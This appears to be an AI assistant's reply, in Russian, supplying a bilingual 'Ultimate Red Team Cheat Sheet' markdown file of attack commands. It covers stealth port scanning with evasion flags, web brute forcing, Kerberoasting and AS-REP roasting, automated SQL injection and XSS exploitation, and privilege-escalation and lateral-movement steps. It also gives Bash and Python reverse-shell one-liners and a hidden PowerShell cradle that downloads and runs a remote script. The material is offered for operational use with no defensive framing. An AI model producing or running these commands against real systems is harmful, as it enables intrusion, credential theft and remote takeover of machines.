## 📄 2. Файл `Ultimate-RedTeam-Sheet.md` — основной боевой файл

Этот файл объединяет все команды в удобной таблице. Я добавил больше реальных техник из твоих ссылок.

```markdown
# ⚔️ Ultimate Red Team Cheat Sheet
**Оперативный справочник. Для каждой команды указан уровень шума.**

---

## 1. Reconnaissance & Enumeration

### 🔍 Network & Infrastructure

| Тип | Команда | Описание (RU) | Описание (EN) |
|-----|---------|---------------|---------------|
| **Noisy** | `nmap -A -p- -T4 -Pn 10.10.10.0/24` | Полное сканирование всех портов, определение ОС и версий. | Full scan all ports, OS and version detection. |
| **Stealth** | `nmap -sS -Pn -f --data-length 200 --max-rate 50 10.10.10.10` | SYN-скан с фрагментацией пакетов и ограничением скорости. | SYN scan with fragmented packets and rate limiting. |
| **Stealth** | `masscan -p1-65535 --rate=1000 10.10.10.0/24` | Быстрое сканирование портов, хорошо для больших сетей. | Fast port scanner, good for large networks. |

### 🌐 Web Discovery

| **Noisy** | `ffuf -w /path/wordlist.txt -u http://target/FUZZ -t 200` | Агрессивный перебор директорий и файлов. | Aggressive directory and file brute forcing. |
| **Stealth** | `gobuster dir -u http://target -w list.txt -q --delay 500ms` | Перебор с задержкой для избежания блокировок. | Directory brute force with delay to avoid bans. |

---

## 2. Active Directory Exploitation

| Тип | Команда | Описание (RU) | Описание (EN) |
|-----|---------|---------------|---------------|
| **Standard** | `impacket-GetNPUsers -dc-ip 10.10.10.10 domain/ -usersfile users.txt -format hashcat` | **AS-REP Roasting**. Получение хэшей пользователей без Kerberos Pre-Auth. | Get users without Kerberos Pre-Auth. |
| **Standard** | `impacket-GetUserSPNs -dc-ip 10.10.10.10 domain/username:password -request` | **Kerberoasting**. Запрос SPN для получения хэша сервисного аккаунта. | Request SPNs to get service account hashes. |
| **Stealth** | `bloodhound-python -c All -d domain.local -u user -p pass -ns 10.10.10.10` | Сбор данных для BloodHound. Трафик похож на легитимный LDAP. | Data collection for BloodHound. Mimics legit LDAP traffic. |

---

## 3. Web Application Attacks

| Тип | Команда | Описание (RU) | Описание (EN) |
|-----|---------|---------------|---------------|
| **SQLi** | `sqlmap -u "http://target/page?id=1" --batch --random-agent` | Автоматическая эксплуатация SQL-инъекции. | Automated SQL injection exploitation. |
| **XSS** | `python3 xsstrike.py -u "http://target/page?param=1"` | Поиск и эксплуатация XSS. | Find and exploit XSS vulnerabilities. |
| **SSTI** | `{{7*7}}` → `49` | **Payload** для проверки Server-Side Template Injection. | Test payload for Server-Side Template Injection. |

---

## 4. Reverse Shells (One-Liners)

| Язык | Команда |
|------|---------|
| **Bash** | `bash -i >& /dev/tcp/10.10.10.10/4444 0>&1` |
| **Python3** | `python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("10.10.10.10",4444));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("/bin/bash")'` |
| **PowerShell** | `powershell -NoP -NonI -W Hidden -Exec Bypass -Command "IEX(New-Object Net.WebClient).DownloadString('http://10.10.10.10:80/shell.ps1');"` |

---

## 5. Post-Exploitation & Lateral Movement

| Тип | Команда | Описание (RU) | Описание (EN) |
|-----|---------|---------------|---------------|
| **Linux PrivEsc** | `sudo -l`, `find / -perm -4000 2>/dev/null` | Проверка прав sudo и поиск SUID битов. | Check sudo rights and find SUID binaries. |
| **Windows PrivEsc** | `whoami /priv`, `powershell -c "Get-WmiObject -Class Win32_UserAccount"` | Просмотр привилегий и локальных пользователей. | List privileges and local users. |
| **Lateral Move** | `impacket-psexec domain/user:pass@10.10.10.20` | Удаленное выполнение команд через SMB (громко). | Remote command execution via SMB (noisy). |
| **Stealth Move** | `ssh -J user@jumpbox user@target` | Прыжок через прокси для сокрытия источника. | Jump through a proxy to hide origin. |
